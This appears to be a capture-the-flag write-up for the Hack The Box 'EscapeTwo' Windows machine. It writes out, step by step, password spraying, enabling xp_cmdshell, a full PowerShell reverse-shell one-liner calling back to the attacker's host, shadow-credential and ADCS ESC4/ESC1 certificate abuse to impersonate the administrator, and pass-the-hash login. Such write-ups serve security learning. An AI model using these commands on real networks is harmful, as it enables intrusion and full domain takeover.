summary: Initial Enumeration reveals an Excel file which discloses sensitive credentials that allow us to gain a foothold, then performing lateral movement to identify more credentials and gaining user access. Then, leveraging ACL misconfigurations to enumerate vulnerable cerificates which leads to ESC4. Thus, gaining DA

```

Scanning shows the DNS is `sequel.htb` so let's put that in the `hosts` file. Other than that, scanning also reveals a running MSSQL Server on port `1433`.
Let us now enumerate users and shares

---

## Enumerating

```
> nxc smb sequel.htb -u rose -p 'KxEPkKe6R8su' --users
```

![Description](/static/images/htb/windows/escapetwo/1.jpg)

Put them in a file called `usernames.txt`, for the shares I couldn't enumerate them using `nxc`, I kept getting the NETBIOSTimeout errorso I used `smbclient`

```
❯ smbclient -L 10.129.245.75 -U rose%KxEPkKe6R8su
```

![Description](/static/images/htb/windows/escapetwo/2.jpg)

I assumed all the shares were out of reach except the `Accounting Department` share

```
❯ smbclient "//10.129.245.75/Accounting Department" -U rose%KxEPkKe6R8su
```

![Description](/static/images/htb/windows/escapetwo/3.jpg)

I downloaded the files and opened them up on an online xlsx viewer. One of the files reveals some juicy credentials

![Description](/static/images/htb/windows/escapetwo/4.jpg)

Since we already now what users are valid based on the enumeration earlier, we can cross-check the available,
but it wouldn't hurt to just put them all in a wordlist. I put them in `passwords.txt`

Then I sprayed all the combinations

```
❯ nxc smb sequel.htb -u usernames.txt -p passwords.txt --continue-on-success
```

We have a hit on `oscar:86LxLBMgEWaKUnBG`

![Description](/static/images/htb/windows/escapetwo/5.jpg)

Then I noticed the `sa` user with his odd password which maybe hinting he is a sysadmin at the MSSQL Server. I
also sprayed it using the `mssql` protocol

```
❯ nxc mssql sequel.htb -u usernames.txt -p passwords.txt --continue-on-success --local-auth
```

Spot On

![Description](/static/images/htb/windows/escapetwo/6.jpg)

---

## Gaining Access

Confirm current user is sysadmin

```
❯ nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -M mssql_priv
```

![Description](/static/images/htb/windows/escapetwo/7.jpg)

Now continue to execute Windows commands using `xp_cmdshell` option

```
❯ nxc mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -x 'whoami'
```

![Description](/static/images/htb/windows/escapetwo/8.jpg)

I checked the `Desktop` folder there was no flag yet but I found the supposed user that we need to access

![Description](/static/images/htb/windows/escapetwo/9.jpg)

We need to find a way to get to `ryan` but before that I wanted to get on the machine first for a more interactive session

```
❯ impacket-mssqlclient sa@sequel.htb
```

As sysadmin, we can configure some settings to enable `xp_cmdshell` to execute commands so we can get a reverse shell

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Now test for command execution

```
EXEC xp_cmdshell 'whoami';
```

![Description](/static/images/htb/windows/escapetwo/10.jpg)

Now we start a listener and use this one liner Powershell command to get an interactive shell

```
EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.32'',1234);$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{0};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

## Lateral Movement

Nice, we are in. Browsing through, we can find a `SQL2019` folder, which has the configurations of the SQL Server

![Description](/static/images/htb/windows/escapetwo/12.jpg)

We can find a password in a file called `sql-Configuration.INI`

![Description](/static/images/htb/windows/escapetwo/13.jpg)

We can try to verify if it is `ryan`'s password

![Description](/static/images/htb/windows/escapetwo/14.jpg)

Valid! Now we can retrieve the user flag

![Description](/static/images/htb/windows/escapetwo/15.jpg)

---

## Privilege Escalation

Looking at Bloodhound, we find that `ryan` has `WriteOwner` ACE over `ca_svc` which is also apart of
the `Cert Publishers` group which means we can probably test for ADCS vulnerabilities by performing
Shadow Credential Attack that populates the `msDS-KeyCredentialLink` attribute on the targeted account

![Description](/static/images/htb/windows/escapetwo/16.jpg)

![Description](/static/images/htb/windows/escapetwo/17.jpg)

But first we need to change the ownership of `ca_svc` to Ryan

```
❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
```

![Description](/static/images/htb/windows/escapetwo/18.jpg)

Now we give `ryan` `GenericAll` ACE over `ca_svc`

```
❯ bloodyAD --host 10.129.245.75 -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 add genericAll ca_svc ryan
```

![Description](/static/images/htb/windows/escapetwo/19.jpg)

Great, now we can Shadow Credentials Attack to get the NT hash of `ca_svc`

```
certipy shadow auto -u 'ryan@sequel.htb' -p WqSZAF6CysDQbGb3 -account 'ca_svc'
```

![Description](/static/images/htb/windows/escapetwo/20.jpg)

Now we can enumerate for vulnerable Certificates using `ca_svc`'s credentials

```
certipy find -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -target 10.129.245.75 -stdout -vulnerable
```

![Description](/static/images/htb/windows/escapetwo/21.jpg)

Observe it is vulnerable to ESC4, which according to this [article](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/),
allows users with low privileges to modify the template and making it vulnerable to ESC1/ESC2/ESC3 and thus requesting an administrator certificate

Based on the vulnerable template we have enumerated, we can find the name of it

![Description](/static/images/htb/windows/escapetwo/22.jpg)

Now let us modify the template

```
❯ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.245.75 -template DunderMifflinAuthentication -write-default-configuration
```

![Description](/static/images/htb/windows/escapetwo/23.jpg)

Next enumerate once again to find the added vulnerabilities

![Description](/static/images/htb/windows/escapetwo/24.jpg)

Now, we see it is vulnerable to ESC1 of which we can exploit easily. Request the admin certificate with the vulnerable template

```
❯ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.245.75 -target DC01.sequel.htb -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

![Description](/static/images/htb/windows/escapetwo/25.jpg)

Once we have obtained the .pfx certificate file, we can request the domain admin TGT Ticket or the administrator hash to gain access to the domain controller.

```
❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.245.75'
```

![Description](/static/images/htb/windows/escapetwo/26.jpg)

Nice, now can WinRM inside `Administrator` and get the root flag

```
❯ evil-winrm -i 10.129.245.75 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

![Description](/static/images/htb/windows/escapetwo/27.jpg)
